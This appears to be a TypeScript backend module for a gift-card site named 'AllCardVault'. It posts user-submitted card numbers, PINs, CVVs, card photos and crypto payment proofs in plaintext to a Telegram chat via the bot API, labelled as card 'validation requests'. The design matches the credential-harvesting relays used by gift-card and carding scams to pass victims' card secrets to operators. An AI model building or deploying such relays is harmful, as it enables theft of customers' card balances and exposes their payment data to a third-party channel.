import fetch from 'node-fetch';

export interface TelegramCardData {
  id?: string;
  brand: string;
  cardNumber: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  cardAmount?: number | null;
  currency?: string | null;
  customerEmail?: string | null;
  status?: string | null;
  notes?: string | null;
  images?: string[] | null;
  createdAt?: Date | string | null;
}

export interface TelegramPaymentProofData {
  orderId: string;
  cardName: string;
  amount: number;
  currency: string;
  customerEmail: string;
  cryptoCurrency?: string | null;
  cryptoAmount?: number | string | null;
  walletAddress?: string | null;
  txHash?: string | null;
  receiptImage?: string | null;
  paymentStatus?: string | null;
  createdAt?: Date | string | null;
}

/**
 * Sanitizes Telegram Bot Token (strips quotes, whitespace, and duplicate 'bot' prefix if provided).
 */
function cleanBotToken(raw?: string | null): string {
  if (!raw) return '';
  let token = raw.trim().replace(/^["']|["']$/g, '');
  if (token.toLowerCase().startsWith('bot')) {
    token = token.slice(3).trim();
  }
  return token;
}

/**
 * Sanitizes Telegram Chat ID (strips quotes and whitespace).
 */
function cleanChatId(raw?: string | null): string {
  if (!raw) return '';
  return raw.trim().replace(/^["']|["']$/g, '');
}

/**
 * Converts a base64 Data URL (data:image/jpeg;base64,...) to a Blob for multipart upload.
 */
function dataUrlToBlob(dataUrl: string): { blob: Blob; filename: string } | null {
  try {
    const matches = dataUrl.match(/^data:(image\/[a-zA-Z0-9+.-]+);base64,(.+)$/);
    if (!matches) return null;
    const mimeType = matches[1];
    const base64Data = matches[2];
    const buffer = Buffer.from(base64Data, 'base64');
    const ext = mimeType.split('/')[1] || 'jpeg';
    const blob = new Blob([buffer], { type: mimeType });
    return { blob, filename: `card_photo.${ext}` };
  } catch (e) {
    console.warn('[Telegram Service] Failed to convert base64 image to Blob:', e);
    return null;
  }
}

export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ success: boolean; message?: string }> {
  const botToken = cleanBotToken(process.env.TELEGRAM_BOT_TOKEN);
  const chatId = cleanChatId(process.env.TELEGRAM_CHAT_ID);

  if (!botToken || !chatId || botToken === 'YOUR_TELEGRAM_BOT_TOKEN') {
    console.log('[Telegram Service] Notice: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured in environment.');
    return { success: false, message: 'Telegram Bot Token or Chat ID not configured.' };
  }

  const brandName = card.brand || 'Unknown Gift Card';
  const amountStr = typeof card.cardAmount === 'number' && card.cardAmount > 0
    ? `${card.currency || 'USD'} $${card.cardAmount.toFixed(2)}`
    : 'Not Specified';
  const customer = card.customerEmail || 'Guest User';
  const statusStr = card.status || 'PENDING';

  // Format HTML message for Telegram
  let htmlCaption = `<b>🚨 NEW CARD UPLOADED / VALIDATION REQUEST</b>\n\n`;
  htmlCaption += `<b>💳 Brand:</b> ${brandName}\n`;
  htmlCaption += `<b>🔢 Card Number:</b> <code>${card.cardNumber || 'N/A'}</code>\n`;
  if (card.pin) htmlCaption += `<b>🔑 PIN:</b> <code>${card.pin}</code>\n`;
  if (card.cvv) htmlCaption += `<b>🔒 CVV:</b> <code>${card.cvv}</code>\n`;
  if (card.expiryDate) htmlCaption += `<b>📅 Expiry:</b> ${card.expiryDate}\n`;
  htmlCaption += `<b>💵 Balance/Amount:</b> ${amountStr}\n`;
  htmlCaption += `<b>📧 Customer:</b> ${customer}\n`;
  htmlCaption += `<b>⚡ Status:</b> ${statusStr}\n`;
  if (card.notes) htmlCaption += `<b>📝 Notes:</b> ${card.notes}\n`;
  htmlCaption += `\n<b>⏰ Time:</b> ${new Date().toUTCString()}`;

  // Plain text fallback
  let plainCaption = `🚨 NEW CARD UPLOADED / VALIDATION REQUEST\n\n`;
  plainCaption += `Brand: ${brandName}\n`;
  plainCaption += `Card Number: ${card.cardNumber || 'N/A'}\n`;
  if (card.pin) plainCaption += `PIN: ${card.pin}\n`;
  if (card.cvv) plainCaption += `CVV: ${card.cvv}\n`;
  if (card.expiryDate) plainCaption += `Expiry: ${card.expiryDate}\n`;
  plainCaption += `Amount: ${amountStr}\n`;
  plainCaption += `Customer: ${customer}\n`;
  plainCaption += `Status: ${statusStr}\n`;
  if (card.notes) plainCaption += `Notes: ${card.notes}\n`;
  plainCaption += `\nTime: ${new Date().toUTCString()}`;

  // Extract clean valid image strings
  const imageList = Array.isArray(card.images)
    ? card.images.filter((img) => typeof img === 'string' && img.trim().length > 0)
    : [];

  const safeHtmlCaption = htmlCaption.length > 1000 ? htmlCaption.slice(0, 990) + '\n...' : htmlCaption;
  const safePlainCaption = plainCaption.length > 1000 ? plainCaption.slice(0, 990) + '\n...' : plainCaption;

  // 1. Send attached photos if available
  if (imageList.length > 0) {
    console.log(`[Telegram Service] Sending card alert with ${imageList.length} attached photo(s)...`);
    
    const firstImg = imageList[0];

    if (firstImg.startsWith('data:')) {
      const parsedBlob = dataUrlToBlob(firstImg);
      if (parsedBlob) {
        try {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('caption', safeHtmlCaption);
          formData.append('parse_mode', 'HTML');
          formData.append('photo', parsedBlob.blob, parsedBlob.filename);

          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData as any,
          });

          const data = (await res.json()) as any;
          if (data.ok) {
            console.log(`[Telegram Service] ✅ Card photo successfully posted to Telegram!`);
            return { success: true };
          } else {
            console.warn(`[Telegram Service] Base64 sendPhoto HTML notice: ${data.description || 'Retrying with plain text...'}`);
            const formDataPlain = new FormData();
            formDataPlain.append('chat_id', chatId);
            formDataPlain.append('caption', safePlainCaption);
            formDataPlain.append('photo', parsedBlob.blob, parsedBlob.filename);

            const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: formDataPlain as any,
            });
            const dataPlain = (await resPlain.json()) as any;
            if (dataPlain.ok) {
              return { success: true };
            }
          }
        } catch (err) {
          console.warn(`[Telegram Service] Base64 sendPhoto error:`, err);
        }
      }
    } else if (firstImg.startsWith('http://') || firstImg.startsWith('https://')) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            photo: firstImg.trim(),
            caption: safeHtmlCaption,
            parse_mode: 'HTML',
          }),
        });

        const data = (await res.json()) as any;
        if (data.ok) {
          return { success: true };
        } else {
          const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              photo: firstImg.trim(),
              caption: safePlainCaption,
            }),
          });
          const dataPlain = (await resPlain.json()) as any;
          if (dataPlain.ok) return { success: true };
        }
      } catch (err) {
        console.warn(`[Telegram Service] URL sendPhoto error:`, err);
      }
    }
  }

  // 2. Fallback text notification if no images or image upload failed
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: safeHtmlCaption,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      console.log(`[Telegram Service] ✅ Card alert HTML text message sent to Telegram chat ${chatId}`);
      return { success: true };
    }

    // Try plain text if Markdown parse error occurred
    const fallbackResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: safePlainCaption,
        disable_web_page_preview: true,
      }),
    });

    const fallbackData = (await fallbackResponse.json()) as any;
    if (fallbackData.ok) {
      console.log(`[Telegram Service] ✅ Card alert fallback text sent to Telegram chat ${chatId}`);
      return { success: true };
    } else {
      console.warn(`[Telegram Service] Telegram API Notice:`, fallbackData.description || fallbackData);
      return { success: false, message: fallbackData.description || 'Failed to send Telegram message' };
    }
  } catch (err: any) {
    console.warn(`[Telegram Service] Connection notice:`, err?.message || err);
    return { success: false, message: err?.message || 'Connection error' };
  }
}

export async function sendTelegramTestMessage(customToken?: string, customChatId?: string): Promise<{ success: boolean; message: string }> {
  const botToken = cleanBotToken(customToken || process.env.TELEGRAM_BOT_TOKEN);
  const chatId = cleanChatId(customChatId || process.env.TELEGRAM_CHAT_ID);

  if (!botToken || !chatId) {
    return {
      success: false,
      message: 'Please enter both your Telegram Bot Token and Chat ID.',
    };
  }

  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      return { success: true, message: 'Test message sent successfully to Telegram!' };
    }

    // Retry with plain text
    const plainText = `🎉 AllCardVault Telegram Bot Test\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\nConnected: ${new Date().toUTCString()}`;
    const fallbackResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: plainText,
      }),
    });

    const fallbackData = (await fallbackResponse.json()) as any;
    if (fallbackData.ok) {
      return { success: true, message: 'Test message sent successfully to Telegram!' };
    } else {
      return { success: false, message: `Telegram Error: ${fallbackData.description || 'Invalid Bot Token or Chat ID'}` };
    }
  } catch (err: any) {
    return { success: false, message: `Network Error: ${err?.message || 'Failed to reach Telegram API'}` };
  }
}

/**
 * Sends a Telegram notification alert specifically for new payment proofs & transaction hashes submitted during checkout.
 */
export async function sendTelegramPaymentProofAlert(proof: TelegramPaymentProofData): Promise<{ success: boolean; message?: string }> {
  const botToken = cleanBotToken(process.env.TELEGRAM_BOT_TOKEN);
  const chatId = cleanChatId(process.env.TELEGRAM_CHAT_ID);

  if (!botToken || !chatId || botToken === 'YOUR_TELEGRAM_BOT_TOKEN') {
    console.log('[Telegram Service] Notice: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured for payment alert.');
    return { success: false, message: 'Telegram Bot credentials missing.' };
  }

  const orderId = proof.orderId || 'ORD-UNKNOWN';
  const cardName = proof.cardName || 'Gift Card Order';
  const amountStr = `${proof.currency || 'USD'} $${Number(proof.amount || 0).toFixed(2)}`;
  const cryptoStr = proof.cryptoAmount ? `(${proof.cryptoAmount} ${proof.cryptoCurrency || 'Crypto'})` : '';
  const customer = proof.customerEmail || 'Guest Customer';
  const txHash = proof.txHash?.trim() || 'Photo Screenshot Uploaded';
  const wallet = proof.walletAddress || 'Platform Wallet';
  const status = proof.paymentStatus || 'PENDING VERIFICATION';

  let htmlCaption = `<b>💳 NEW PAYMENT PROOF / TX HASH SUBMITTED</b>\n\n`;
  htmlCaption += `<b>📦 Order ID:</b> <code>${orderId}</code>\n`;
  htmlCaption += `<b>🎁 Gift Card:</b> ${cardName}\n`;
  htmlCaption += `<b>💰 Order Total:</b> ${amountStr} ${cryptoStr}\n`;
  htmlCaption += `<b>📧 Customer Email:</b> <code>${customer}</code>\n`;
  if (proof.cryptoCurrency) htmlCaption += `<b>🌐 Crypto Asset:</b> ${proof.cryptoCurrency}\n`;
  htmlCaption += `<b>📍 Deposit Wallet:</b> <code>${wallet}</code>\n`;
  htmlCaption += `<b>🔑 Transaction ID / Hash:</b> <code>${txHash}</code>\n`;
  htmlCaption += `<b>⚡ Status:</b> ${status}\n`;
  htmlCaption += `\n<b>⏰ Timestamp:</b> ${new Date().toUTCString()}`;

  let plainCaption = `💳 NEW PAYMENT PROOF / TX HASH SUBMITTED\n\n`;
  plainCaption += `Order ID: ${orderId}\n`;
  plainCaption += `Gift Card: ${cardName}\n`;
  plainCaption += `Order Total: ${amountStr} ${cryptoStr}\n`;
  plainCaption += `Customer Email: ${customer}\n`;
  if (proof.cryptoCurrency) plainCaption += `Crypto Asset: ${proof.cryptoCurrency}\n`;
  plainCaption += `Deposit Wallet: ${wallet}\n`;
  plainCaption += `Transaction ID / Hash: ${txHash}\n`;
  plainCaption += `Status: ${status}\n`;
  plainCaption += `\nTimestamp: ${new Date().toUTCString()}`;

  const safeHtmlCaption = htmlCaption.length > 1000 ? htmlCaption.slice(0, 990) + '\n...' : htmlCaption;
  const safePlainCaption = plainCaption.length > 1000 ? plainCaption.slice(0, 990) + '\n...' : plainCaption;

  // 1. Send attached photo screenshot if present
  if (proof.receiptImage && proof.receiptImage.trim().length > 0) {
    const img = proof.receiptImage.trim();

    if (img.startsWith('data:')) {
      const parsedBlob = dataUrlToBlob(img);
      if (parsedBlob) {
        try {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('caption', safeHtmlCaption);
          formData.append('parse_mode', 'HTML');
          formData.append('photo', parsedBlob.blob, `payment_proof_${orderId}.jpg`);

          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData as any,
          });

          const data = (await res.json()) as any;
          if (data.ok) {
            console.log(`[Telegram Service] ✅ Payment screenshot photo posted to Telegram chat ${chatId}!`);
            return { success: true };
          } else {
            console.warn(`[Telegram Service] Base64 sendPhoto HTML response: ${data.description || 'Fallback to plain text photo'}`);
            
            const formDataPlain = new FormData();
            formDataPlain.append('chat_id', chatId);
            formDataPlain.append('caption', safePlainCaption);
            formDataPlain.append('photo', parsedBlob.blob, `payment_proof_${orderId}.jpg`);

            const resPlain = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: formDataPlain as any,
            });
            const dataPlain = (await resPlain.json()) as any;
            if (dataPlain.ok) {
              console.log(`[Telegram Service] ✅ Payment screenshot photo posted to Telegram chat (plain text caption)!`);
              return { success: true };
            }
          }
        } catch (e) {
          console.warn('[Telegram Service] Base64 payment photo error:', e);
        }
      }
    } else if (img.startsWith('http://') || img.startsWith('https://')) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            photo: img,
            caption: safeHtmlCaption,
            parse_mode: 'HTML',
          }),
        });
        const data = (await res.json()) as any;
        if (data.ok) return { success: true };
      } catch (e) {
        console.warn('[Telegram Service] URL payment photo error:', e);
      }
    }
  }

  // 2. Text message fallback (guarantees alert delivery even if photo fails/times out)
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: safeHtmlCaption,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    const data = (await res.json()) as any;
    if (data.ok) {
      console.log(`[Telegram Service] ✅ Payment proof text alert posted to Telegram chat ${chatId}!`);
      return { success: true };
    }

    const fallbackRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: safePlainCaption,
        disable_web_page_preview: true,
      }),
    });
    const fallbackData = (await fallbackRes.json()) as any;
    if (fallbackData.ok) {
      console.log(`[Telegram Service] ✅ Payment proof plain text alert posted to Telegram!`);
      return { success: true };
    } else {
      console.warn('[Telegram Service] Telegram API alert notice:', fallbackData.description || fallbackData);
      return { success: false, message: fallbackData.description || 'Telegram alert failed' };
    }
  } catch (err: any) {
    console.error('[Telegram Service] Network error in payment alert:', err?.message || err);
    return { success: false, message: err?.message };
  }
}
